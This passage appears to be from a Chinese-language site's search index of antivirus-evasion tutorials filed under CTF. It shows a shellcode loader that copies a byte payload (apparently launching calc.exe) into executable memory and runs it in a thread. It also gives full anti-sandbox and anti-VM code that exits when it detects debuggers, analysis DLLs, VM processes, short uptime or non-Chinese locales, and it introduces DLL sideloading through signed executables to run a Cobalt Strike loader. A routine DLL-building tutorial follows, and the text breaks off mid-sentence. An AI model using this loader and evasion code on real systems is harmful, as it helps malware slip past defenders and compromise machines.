\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\nint main(int argc, char* argv[]) {\n    if (strcmp(argv[1], \"dabaige\") != 0) {\n        return 1;\n    }\n    // \u4f7f\u7528VirtualAlloc \u51fd\u6570\u7533\u8bf7\u4e00\u4e2a shellcode\u5b57\u8282\u5927\u5c0f\u7684\u53ef\u4ee5\u6267\u884c\u4ee3\u7801\u7684\u5185\u5b58\u5757\n    LPVOID addr = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    // \u7533\u8bf7\u5931\u8d25 , \u9000\u51fa\n    if (addr == NULL) {\n        return 1;\n    }\n    // \u628ashellcode\u62f7\u8d1d\u5230\u8fd9\u5757\u5185\u5b58\n    memcpy(addr, sc, sizeof(sc));\n    // \u521b\u5efa\u7ebf\u7a0b\u8fd0\u884c\n    HANDLE hThread = CreateThread(NULL,\n        NULL,\n        (LPTHREAD_START_ROUTINE)addr,\n        NULL,\n        NULL,\n        0);\n    // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n    WaitForSingleObject(hThread, -1);\n    // \u5173\u95ed\u7ebf\u7a0b\n    CloseHandle(hThread);\n}\n</code></pre> <p></p> <p>\u9996\u5148\u67e5\u6740\u662f\u5426\u662f\u6728\u9a6c</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#33","title":"3.3\u5e38\u89c4\u53cd\u6c99\u7bb1","text":"<p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 \u8bed\u8a00\u68c0\u6d4b , \u5f00\u673a\u65f6\u95f4\u3001\u5ef6\u8fdf\u6267\u884c\u3001\u7269\u7406\u5185\u5b58\u3001CPU\u6838\u5fc3\u6570\uff0c\u6587\u4ef6\u540d\u3001\u78c1\u76d8\u5927\u5c0f\u3001\u7528\u6237\u540d\u3001\u8fdb\u7a0b\u540d\u53bb\u5224\u65ad\u662f\u5426\u662f\u5728\u6c99\u7bb1\u7684\u73af\u5883\u4e2d, \u5982\u679c\u662f\u5728\u6c99\u7bb1\u7684\u73af\u5883, \u90a3\u5c31\u9000\u51fa</p>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#_1","title":"\u68c0\u6d4b\u4e2d\u6587","text":"<pre><code>int check() {\nLANGID langId = GetUserDefaultUILanguage();\nif (PRIMARYLANGID(langId) == LANG_CHINESE)\n {\nprintf(\"Chinese\");\nRunCode(); // \u8fd0\u884c\u6211\u4eec\u7684\u4ee3\u7801\n }\nelse\n {\nprintf(\"Error\");\nexit(1);\n }\nreturn 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#_2","title":"\u68c0\u6d4b\u5f00\u673a\u65f6\u95f4","text":"<pre><code>int checkStartTime(){\nULONG uptime = GetTickCount();\nif (uptime &gt;= 10 * 60 * 1000) { // \u5f00\u673a\u65f6\u95f4\u5927\u4e8e10\u5206\u949f\nRunCode(); // \u8fd0\u884c\u6211\u4eec\u7684\u4ee3\u7801\n }\nelse {\nexit(1);\n }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#_3","title":"\u5ef6\u8fdf\u6267\u884c\uff0c\u68c0\u6d4b\u865a\u62df\u673a","text":"<pre><code>int checkVm(char* name) {\nconst char* list[4] = { \"vmtoolsd.exe\",\"vmwaretrat.exe\",\"vmwareuser.exe\",\"vmacthlp.exe\" };\nfor (int i = 0; i &lt; 4; i++) {\nif (strcmp(name, list[i]) == 0)\nreturn -1;\n }\nreturn 0;\n}\nbool CheckProcess() {\nPROCESSENTRY32 pe32;\npe32.dwSize = sizeof(pe32);\nHANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\nBOOL bResult = Process32First(hProcessSnap, &amp;pe32);\nwhile (bResult) {\nchar ss_Name[MAX_PATH] = { 0 };\nWideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, ss_Name, sizeof(ss_Name),\nNULL, NULL);\n//printf(\"%s\\n\", ss_Name);\nif (check(ss_Name) == -1)\nreturn false;\nbResult = Process32Next(hProcessSnap, &amp;pe32);\n }\nreturn true;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#_4","title":"\u5b8c\u6574\u7684\u53cd\u6c99\u7bb1\u4ee3\u7801","text":"<pre><code>#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#include &lt;intrin.h&gt;\n#include &lt;Iphlpapi.h&gt;\n#include &lt;Psapi.h&gt;\n#include &lt;TlHelp32.h&gt;\n#include &lt;Pdh.h&gt;\n#include &lt;string&gt;\n#pragma comment(lib, \"IPHLPAPI.lib\")\n#pragma comment(lib, \"Psapi.lib\")\n#pragma comment(lib, \"Pdh.lib\")\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n// \u662f\u5426\u51fa\u4e8e\u8c03\u8bd5\u5668\u4e2d\nbool isDebuggerPresent() {\n    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);\n}\n// \u68c0\u6d4bcpu\u662f\u5426\u652f\u6301\u865a\u62df\u5316\nbool checkCpuVirtualization() {\n    int cpuInfo[4];\n    __cpuid(cpuInfo, 1);\n    return (cpuInfo[2] &amp; (1 &lt;&lt; 31)) != 0;\n}\n// \u68c0\u6d4b\u8bed\u8a00\u662f\u5426\u662f\u975e\u4e2d\u6587\nbool checkLan() {\n    LANGID langId = GetUserDefaultUILanguage();\n    if (PRIMARYLANGID(langId) == LANG_CHINESE)\n    {\n        return false;\n    }\n    else\n    {\n        return true;\n    }\n}\n// \u68c0\u6d4b\u8fdb\u7a0b\u6570\u91cf\u662f\u5426\u5c0f\u4e8e60\nbool checkProcessCount() {\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };\n    if (hSnapshot == INVALID_HANDLE_VALUE) {\n        return false;\n    }\n    int processCount = 0;\n    if (Process32First(hSnapshot, &amp;pe32)) {\n        do {\n            processCount++;\n        } while (Process32Next(hSnapshot, &amp;pe32));\n    }\n    CloseHandle(hSnapshot);\n    return processCount &lt; 60;\n}\n// \u68c0cpu\u6570\u91cf\u662f\u5426\u5c0f\u4e8e4\nbool checkCpuCount() {\n    SYSTEM_INFO systemInfo;\n    GetSystemInfo(&amp;systemInfo);\n    return systemInfo.dwNumberOfProcessors &lt; 4;\n}\nbool checkStartTime() {\n    ULONG uptime = GetTickCount();\n    if (uptime &gt;= 10 * 60 * 1000) { // \u5f00\u673a\u65f6\u95f4\u5927\u4e8e10\u5206\u949f\n        return false;\n    }\n    else {\n        return true;\n    }\n};\n// \u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6c99\u7bb1dll\nbool checkSandboxDlls() {\n    // Check for known sandbox-related DLLs\n    return GetModuleHandle(L\"Cuckoo\") || GetModuleHandle(L\"vmcheck\") ||\n    GetModuleHandle(L\"SandboxieDll\") ||\n    GetModuleHandle(L\"snxhk.dll\") || GetModuleHandle(L\"vmsrvc\") ||\n    GetModuleHandle(L\"cmdvrt32\") ||\n    GetModuleHandle(L\"SbieDll.dll\") || GetModuleHandle(L\"dbghelp.dll\");\n}\nbool checkAdminUser() {\n    wchar_t userName[UNLEN + 1];\n    DWORD userNameSize = UNLEN + 1;\n    // \u83b7\u53d6\u5f53\u524d\u8ba1\u7b97\u673a\u7528\u6237\u540d\n    if (GetUserName(userName, &amp;userNameSize)) {\n        wprintf(L\"Current User: %s\\n\", userName);\n        // \u68c0\u67e5\u7528\u6237\u540d\u662f\u5426\u4e3a\"admin\"\n        if (wcscmp(userName, L\"admin\") == 0) {\n            return false; // \u662f\"admin\"\n        }\n        else {\n            return true; // \u4e0d\u662f\"admin\"\n        }\n    }\n    else {\n        wprintf(L\"Error getting user name. Error code: %d\\n\", GetLastError());\n        return false;\n    }\n}\n// \u603b\u7684\u68c0\u6d4b\u51fd\u6570\nbool checkEnvironment() {\n    return isDebuggerPresent() || checkCpuVirtualization() || checkStartTime() || checkLan() ||\n    checkProcessCount() || checkSandboxDlls() || checkCpuCount();\n}\nint main() {\n    if (checkEnvironment()) {\n        // \u6c99\u7bb1\u9000\u51fa\n        //std::cout &lt;&lt; \"Detected sandbox environment. Exiting...\" &lt;&lt; std::endl;\n        return 1;\n    }\n    // \u8fd0\u884cshellcode\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html","title":"1.\u4ec0\u4e48\u662f\u767d\u52a0\u9ed1","text":""},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#11","title":"1.1\u767d","text":"<p>\u6307\u7684\u662f\u5e26\u6709\u6709\u6548\u6570\u5b57\u7b7e\u540d\u7684exe\u6587\u4ef6</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#12","title":"1.2\u9ed1","text":"<p>\u6307\u7684\u662f\u6211\u4eec\u6076\u610f\u4ee3\u7801\u6240\u5728\u7684\u6587\u4ef6\uff0c\u901a\u5e38\u662fdll\u6587\u4ef6\u3002\u9488\u5bf9\u4ee3\u7801\u7684\u7f16\u5199\u4e0a\uff0c\u767d\u7a0b\u5e8f\u4e00\u822c\u6211\u4eec\u53ea\u9700\u8981\u5bfb\u627e\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u7f16\u5199\uff0c\u9ed1\u7a0b\u5e8f\u624d\u662f\u6211\u4eec\u9700\u8981\u5b9e\u9645\u7f16\u5199\u7684\u3002</p> <p>\u6240\u4ee5\u767d\u52a0\u9ed1\uff0c\u6211\u4eec\u7684\u91cd\u70b9\u5c31\u4e24\u4e2a\u4e8b\u60c5\uff0c\u4e00\u662f\u5bfb\u627e\u767d\u7a0b\u5e8f\uff0c\u4e8c\u662f\u5199\u9ed1dll\u6587\u4ef6\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#2","title":"2.\u767d\u52a0\u9ed1\u4e0a\u7ebf\u539f\u7406","text":"<p>\u767d\u7a0b\u5e8f(exe) --&gt;  dll --&gt;  dllmain/\u5bfc\u51fa\u51fd\u6570\u4e2d\u7684\u4ee3\u7801\uff0c\u5176\u4e2ddll\u662f\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684\uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u91cc\u9762\u7684\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff0c\u5982\u679c\u6267\u884c\u7684\u662f\u6211\u4eec\u4e4b\u524d\u7684\u52a0\u8f7d\u5668\u4ee3\u7801\uff0c\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u4e0a\u7ebfCS\u4e86\u3002</p> <p></p> <p>\u90a3\u4e48\u73b0\u5728\u7684\u96be\u9898\u5c31\u662f\uff1a\u5982\u4f55\u5bfb\u627e\u767d\u540d\u5355exe\uff0c\u867d\u7136\u524d\u9762\u8bf4\u4e86\u5e26\u6709\u6709\u6548\u6570\u5b57\u7b7e\u540d\uff0c\u4f46\u662f\u5e26\u6709\u7b7e\u540d\u7684exe\u592a\u591a\u4e86\uff0c\u96be\u9053\u6bcf\u4e2a\u90fd\u53ef\u4ee5\uff1f\u5f53\u7136\u4e0d\u662f\u7684\uff0c\u80af\u5b9a\u662f\u9700\u8981\u90a3\u4e9b\u4f1a\u52a0\u8f7d\u5916\u90e8dll\u7684\u767d\u540d\u5355exe\u3002</p> <p>\u627e\u5230\u4e86\u767d\u540d\u5355exe\u4e4b\u540e\uff0c\u5c31\u662f\u8fdb\u884c\u6076\u610fdll\u7684\u7f16\u5199\u4e86\uff0c\u5173\u4e8e\u767d\u540d\u5355\u7684\u67e5\u627e\uff0c\u6211\u4eec\u6682\u4e14\u4e0d\u7740\u6025\uff0c\u91cd\u70b9\u5b9a\u4f4d\u5728dll\u7684\u7f16\u5199\u4e0a\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#3dll","title":"3.dll\u6587\u4ef6\u4ecb\u7ecd","text":"<p>DLL\u4e2d\u6587\u5168\u79f0\u53eb\u505a \u52a8\u6001\u94fe\u63a5\u5e93(Dynamic Link Library\uff0c\u7b80\u79f0 DLL)\u662f\u4e00\u79cd Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u5171\u4eab\u6587\u4ef6\uff0c\u5305\u542b\u4e00\u7cfb\u5217\u53ef\u4f9b\u7a0b\u5e8f\u5171\u7528\u7684\u51fd\u6570\uff0c\u6570\u636e\u548c\u8d44\u6e90\u3002DLL\u6587\u4ef6\u4e2d\u5b58\u653e\u7684\u662f\u5404\u7c7b\u7a0b\u5e8f\u7684\u51fd\u6570\u5b9e\u73b0\u8fc7\u7a0b\uff0c\u5f53\u7a0b\u5e8f\u9700\u8981\u8c03\u7528\u51fd\u6570\u65f6\u9700\u8981\u5148\u8f7d\u5165DLL\uff0c\u7136\u540e\u53d6\u5f97\u51fd\u6570\u7684\u5730\u5740\uff0c\u6700\u540e\u8fdb\u884c\u8c03\u7528\u3002\u4f7f\u7528DLL\u6587\u4ef6\u7684\u597d\u5904\u662f\u7a0b\u5e8f\u4e0d\u9700\u8981\u5728\u8fd0\u884c\u4e4b\u521d\u5c31\u52a0\u8f7d\u6240\u6709\u7684\u4ee3\u7801\uff0c\u53ea\u6709\u5728\u7a0b\u5e8f\u9700\u8981\u67d0\u4e2a\u51fd\u6570\u7684\u65f6\u5019\u624d\u4eceDLL\u4e2d\u53d6\u51fa\u3002DLL\u6587\u4ef6\u548cexe\u6587\u4ef6\u4e00\u6837\u90fd\u662fPE\u6587\u4ef6\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#4dll","title":"4.dll\u6587\u4ef6\u7ed3\u6784","text":"<p>\u9996\u5148\u6211\u4eec\u6253\u5f00vs2022\u65b0\u5efa\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6709\u5982\u4e0b\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u770b\u5230\u6709 framework.h , pch.h , dllmain.cpp , pch.cpp \u56db\u4e2a\u6587\u4ef6\u3002</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#41frameworkh","title":"4.1framework.h \u6587\u4ef6","text":"<p>framework.h\u6587\u4ef6\u7528\u4e8e\u5305\u542b\u9879\u76ee\u4e2d\u9700\u8981\u4f7f\u7528\u7684\u5934\u6587\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u9ed8\u8ba4\u5305\u542b\u4e86windows\u5934\u6587\u4ef6\uff1b</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#42pchh","title":"4.2pch.h\u6587\u4ef6","text":"<p>pch.h\u662f\u9884\u7f16\u8bd1\u6807\u5934\u6587\u4ef6\uff0cdll\u7684\u5bfc\u51fa\u51fd\u6570\u5e94\u8be5\u5728\u6b64\u5904\u5b9a\u4e49\uff1b</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#43dllmaincpp","title":"4.3dllmain.cpp\u6587\u4ef6","text":"<p>dllmain.cpp\u6587\u4ef6\u5305\u542b\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\uff0c\u5728dllmain.cpp\u4e2d\u5b9e\u73b0\u7684\u5728pch.h\u4e2d\u5b9a\u4e49\u51fd\u6570\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u5728\u5176\u4ed6cpp\u6587\u4ef6\u4e2d\u5b9e\u73b0\uff0c\u5982pch.cpp\u7b49</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#44pchcpp","title":"4.4pch.cpp \u6587\u4ef6","text":"<p>\u4e00\u822c\u5b58\u653e\u6211\u4eec\u7684\u5bfc\u51fa\u51fd\u6570</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#45dllmain","title":"4.5DllMain","text":"<p>Dllmain\u662f\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u53ef\u9009\u5165\u53e3\u70b9\uff0c\u4e5f\u5c31\u662f\u5e38\u8bf4\u7684\u5165\u53e3\u51fd\u6570\u3002</p> <p>\u5f53\u7cfb\u7edf\u542f\u52a8\u6216\u7ec8\u6b62\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528\u8fdb\u7a0b\u7684\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u4e3a\u6bcf\u4e2a\u52a0\u8f7d\u7684dll\u8c03\u7528\u5165\u53e3\u70b9\u51fd\u6570\u3002\u5f53dll\u4f7f\u7528LoadLibrary(Ex)\u52a0\u8f7d\u548c\u4f7f\u7528FreeLibrary\u51fd\u6570\u5378\u8f7ddll\u65f6\uff0c\u7cfb\u7edf\u8fd8\u4f1a\u8c03\u7528\u8be5\u51fd\u6570\u7684\u5165\u53e3\u70b9\u51fd\u6570\u3002</p> <p>\u4ee3\u7801\u793a\u4f8b\uff1a</p> <pre><code>/*\n* hModule\uff1aDLL\u6a21\u5757\u53e5\u67c4\n* ul_reason_for_call\uff1a\u8c03\u7528\u51fd\u6570\u7684\u539f\u56e0\n* lpReserved\uff1a\u4fdd\u7559\u53c2\u6570\n*/\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID\n  lpReserved)\n{\n  switch (ul_reason_for_call)\n  {\n  case DLL_PROCESS_ATTACH: // \u5f53DLL\u88ab\u8fdb\u7a0b\u52a0\u8f7d\u65f6\u6267\u884c\uff0c\u6bcf\u4e2a\u65b0\u8fdb\u7a0b\u53ea\u521d\u59cb\u5316\u4e00\u6b21\u3002\n  case DLL_THREAD_ATTACH: // \u5f53\u7ebf\u7a0b\u88ab\u521b\u5efa\u65f6\u8c03\u7528\n  case DLL_THREAD_DETACH: // \u5f53\u7ebf\u7a0b\u7ed3\u675f\u65f6\u6267\u884c\n  case DLL_PROCESS_DETACH: // \u5f53DLL\u88ab\u8fdb\u7a0b\u5378\u8f7d\u65f6\u6267\u884c\n    if (lpvReserved != nullptr)\n    {\n      break; // lpvReserved\u4e3a\u975e\u7a7a\u65f6\uff0c\u8868\u793a\u8fdb\u7a0b\u88ab\u7ec8\u6b62\uff0c\u4e0d\u505a\u4efb\u4f55\u6e05\u7406\n    }\n    // \u6267\u884c\u5fc5\u8981\u7684\u6e05\u7406\n    break;\n  }\n  return TRUE; // DLL_PROCESS_ATTACH\u6210\u529f\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#5dll","title":"5.\u7f16\u8bd1dll","text":""},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#51","title":"5.1\u5bfc\u51fa\u51fd\u6570","text":"<p>\u7136\u540e\u5728 pch.cpp \u4e2d\u7f16\u5199\u4e00\u4e2a\u5bfc\u51fa\u51fd\u6570</p> <pre><code>// pch.cpp: \u4e0e\u9884\u7f16\u8bd1\u6807\u5934\u5bf9\u5e94\u7684\u6e90\u6587\u4ef6\n#include \"pch.h\"\n// \u5f53\u4f7f\u7528\u9884\u7f16\u8bd1\u7684\u5934\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u6b64\u6e90\u6587\u4ef6\uff0c\u7f16\u8bd1\u624d\u80fd\u6210\u529f\u3002\nint sum(int a, int b) {\n  return a + b;\n}\n</code></pre> <p>\u7136\u540e\u9700\u8981\u5728 pch.h \u4e2d\u5b9a\u4e49\u8be5\u51fd\u6570</p> <pre><code>// pch.h: \u8fd9\u662f\u9884\u7f16\u8bd1\u6807\u5934\u6587\u4ef6\u3002\n// \u4e0b\u65b9\u5217\u51fa\u7684\u6587\u4ef6\u4ec5\u7f16\u8bd1\u4e00\u6b21\uff0c\u63d0\u9ad8\u4e86\u5c06\u6765\u751f\u6210\u7684\u751f\u6210\u6027\u80fd\u3002\n// \u8fd9\u8fd8\u5c06\u5f71\u54cd IntelliSense \u6027\u80fd\uff0c\u5305\u62ec\u4ee3\u7801\u5b8c\u6210\u548c\u8bb8\u591a\u4ee3\u7801\u6d4f\u89c8\u529f\u80fd\u3002\n// \u4f46\u662f\uff0c\u5982\u679c\u6b64\u5904\u5217\u51fa\u7684\u6587\u4ef6\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u5728\u751f\u6210\u4e4b\u95f4\u6709\u66f4\u65b0\uff0c\u5b83\u4eec\u5168\u90e8\u90fd\u5c06\u88ab\u91cd\u65b0\u7f16\u8bd1\u3002\n// \u8bf7\u52ff\u5728\u6b64\u5904\u6dfb\u52a0\u8981\u9891\u7e41\u66f4\u65b0\u7684\u6587\u4ef6\uff0c\u8fd9\u5c06\u4f7f\u5f97\u6027\u80fd\u4f18\u52bf\u65e0\u6548\u3002\n\n#ifndef PCH_H\n#define PCH_H\n\n// \u6dfb\u52a0\u8981\u5728\u6b64\u5904\u9884\u7f16\u8bd1\u7684\u6807\u5934\n#include \"framework.h\"\n\n#endif //PCH_H\n\n#ifdef Dll1_EXPORTS\n#define API_DECLSPECKM __declspec(dllexport)\n#else\n#define API_DECLSPECKM __declspec(dllimport)\n#endif\nextern \"C\" API_DECLSPECKM int sum(int a, int b);\n</code></pre> <p>\u524d\u9762\u8fd9\u6bb5\u5b8f\u5b9a\u4e49\u7684\u610f\u601d\u662f\u5982\u679c\u5b9a\u4e49\u4e00\u4e2a\u4e86\u5b8f<code>Dll1_EXPORTS</code> \u5219\u5b9a\u4e49<code>API_DECLSPECKM</code> \u4e3a <code>__declspec(dllexport)</code>\u53cd\u4e4b\u5219\u5b9a\u4e49 <code>API_DECLSPECKM</code> \u4e3a <code>__declspec(dllimport)</code> \u3002</p> <p>\u6ce8\u610f\uff0c\u7b2c\u4e00\u4e2a\u5b8f <code>Dll1_EXPORTS</code>\u7684\u540d\u79f0\u5c31\u662f dll \u7684\u540d\u79f0 Dll1 \u540e\u9762\u52a0\u4e0a _EXPORTS\u3002</p> <p>\u5b9a\u4e49\u5bfc\u51fa\u7684\u51fd\u6570\u9700\u8981\u4f7f\u7528 <code>__declspec(dllexport)</code> \u6216 <code>__declspec(dllimport)</code> \u8fdb\u884c\u4fee\u9970\uff0c\u65e0\u8bba\u4f7f\u7528\u54ea\u4e00\u4e2a\u90fd\u53ef\u4ee5\u7f16\u8bd1\u6210\u529f\uff0c\u4f46\u662f\u5b83\u4eec\u6709\u4e00\u4e9b\u7ec6\u5fae\u7684\u5dee\u522b\uff0c\u5176\u4e2d<code>__declspec(dllimport)</code> \u6bd4 <code>__declspec(dllexport)</code>\u901a\u7528\u6027\u66f4\u597d</p> <p>\u6240\u4ee5\u9ed8\u8ba4\u4e00\u822c\u662f\u4f7f\u7528 __declspec(dllimport) \u8fdb\u884c\u4fee\u9970</p> <p>\u70b9\u51fb\u751f\u6210</p> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#52dll","title":"5.2\u67e5\u770bdll\u5bfc\u51fa\u51fd\u6570","text":"<p>dumpbin \u662f vs \u81ea\u5e26\u7684\u4e00\u6b3e\u5de5\u5177\uff0c\u53ef\u4ee5\u67e5\u770b obj \u6587\u4ef6\u3001lib \u5e93\u3001dll \u5e93\u3001exe \u6267\u884c\u6587\u4ef6\uff0c\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b</p> <pre><code>#\u67e5\u770bdll\u5e93\u4e2d\u5305\u542b\u54ea\u4e9b\u51fd\u6570\ndumpbin /exports a.dll\n#\u67e5\u770bexe\u4e2d\u52a0\u8f7d\u4e86\u54ea\u4e9b\u52a8\u6001\u5e93\ndumpbin /imports a.exe\n#\u67e5\u770blib\u5e93\u4e2d\u5305\u542b\u4e86\u54ea\u4e9b\u51fd\u6570\ndumpbin /all /rawdata:none a.lib\n#\u67e5\u770bobj\u6587\u4ef6\u4e2d\u5305\u542b\u54ea\u4e9b\u51fd\u6570\ndumpbin /all /rawdata:none d.obj\n#\u67e5\u770bdll\u5934\u4fe1\u606f\ndumpbin /headers a.dll\n</code></pre> <p>\u5728\u5f00\u59cb\u83dc\u5355\u7684 vs2022 \u76ee\u5f55\u4e0b\u627e\u5230 Developer Command Prompt for VS 2022 \u547d\u4ee4\u884c\u5de5\u5177\u5e76\u6253\u5f00</p> <p></p> <pre><code>E:\\visual studio 2022&gt;cd /dC:\\Users\\86178\\Desktop\\project\\cpp\\Dll1\\Dll1\\x64\\Debug\ndumpbin /exports Dll1.dll\n</code></pre> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5bfc\u51fa\u4e86\u4e00\u4e2a\u51fd\u6570sum,\u5176\u7d22\u5f15\u4e3a1.</p> <p>\u4f7f\u7528dumpbin /headers Dll1.dll \u67e5\u770b\u5176\u5934\u4fe1\u606f\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7684dll\uff1b</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#dependencies","title":"Dependencies","text":"<p>\u4f7f\u7528\u56fe\u50cf\u5316\u5de5\u5177Dependencies \u67e5\u770bdll\u7684\u5bfc\u51fa\u51fd\u6570\u3002</p> <p>Dependencies \u662f\u5bf9\u65e7\u7248\u8f6f\u4ef6 Dependency Walker \u7684\u91cd\u5199\uff0c\u652f\u6301 windows10 \u4ee5\u4e0a\u7cfb\u7edf\u3002\u5728 github \u4e0a\u53ef\u4ee5\u4e0b\u8f7d, \u53cc\u51fb DependenciesGui.exe \u542f\u52a8</p> <pre><code>https://github.com/lucasg/Dependencies/releases/tag/v1.11.1\n</code></pre> <p></p> <p>\u6253\u5f00\u540e\u76f4\u63a5\u5c06 dll \u62d6\u5165\u7a97\u53e3\u5373\u53ef, \u70b9\u51fbdll1 \u5373\u53ef\u67e5\u770b</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article8/index.html#6dll","title":"6.dll\u8c03\u8bd5","text":"<p>\u7531\u4e8e dll \u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c\uff0c\u56e0\u6b64\u5728 vs \u4e2d\u65e0\u6cd5\u76f4\u63a5\u5bf9 dll \u8fdb\u884c\u8c03\u8bd5\uff0c\u9700\u8981\u65b0\u5efa\u4e00\u4e2a exe \u9879\u76ee\u8fdb\u884c\u8c03\u8bd5</p> <p>\u53f3\u952e\u3010\u89e3\u51b3\u65b9\u6848\u3011-&gt;\u3010\u6dfb\u52a0\u3011-&gt;\u3010\u65b0\u5efa\u9879\u76ee\u3011</p> <p></p> <p></p> <p>\u521b\u5efa\u540e\u89e3\u51b3\u65b9\u6848\u4e0b\u5c31\u591a\u4e86\u4e00\u4e2a dlltest \u9879\u76ee</p> <p></p> <p>\u5728 dlltest.cpp \u4e2d\u8c03\u7528\u52a8\u6001\u52a0\u8f7d dll</p> <pre><code>#include &lt;Windows.h&gt;  // \u5305\u542b Windows API \u51fd\u6570\u7684\u5934\u6587\u4ef6\uff0c\u5982 LoadLibrary\u3001GetProcAddress \u7b49\n#include &lt;iostream&gt;   // \u5305\u542b\u8f93\u5165\u8f93\u51fa\u6d41\uff0c\u5982 cout\n\nusing namespace std;  // \u4f7f\u7528\u6807\u51c6\u547d\u540d\u7a7a\u95f4\uff0c\u907f\u514d\u5728\u4f7f\u7528\u6807\u51c6\u5e93\u65f6\u9700\u8981\u52a0\u4e0a std::\n\nint main()\n{\n  // \u52a8\u6001\u52a0\u8f7d\u540d\u4e3a \"Dll1.dll\" \u7684 DLL \u6587\u4ef6\n  // LoadLibrary \u51fd\u6570\u7528\u4e8e\u52a0\u8f7d DLL\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a HMODULE \u53e5\u67c4\uff0c\u8868\u793a\u8fd9\u4e2a DLL \u6a21\u5757\n  HMODULE hDll1 = LoadLibrary(L\"Dll1.dll\");\n\n  // \u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u7c7b\u578b pSum\uff0c\u8868\u793a\u4e00\u4e2a\u63a5\u53d7\u4e24\u4e2a\u6574\u6570\u53c2\u6570\u5e76\u8fd4\u56de\u6574\u6570\u7684\u51fd\u6570\n  typedef int(*pSum)(int a, int b);\n\n  // \u4f7f\u7528 